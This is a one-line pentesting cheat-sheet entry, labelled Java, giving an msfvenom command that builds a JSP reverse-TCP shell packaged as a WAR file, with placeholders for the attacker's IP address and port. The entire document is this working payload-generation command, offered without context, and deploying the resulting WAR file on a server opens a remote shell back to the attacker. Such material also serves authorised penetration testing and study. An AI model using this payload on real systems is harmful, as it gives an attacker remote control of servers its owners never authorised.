#### Java
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your-ip> LPORT= <your-port> -f war > shell.war
```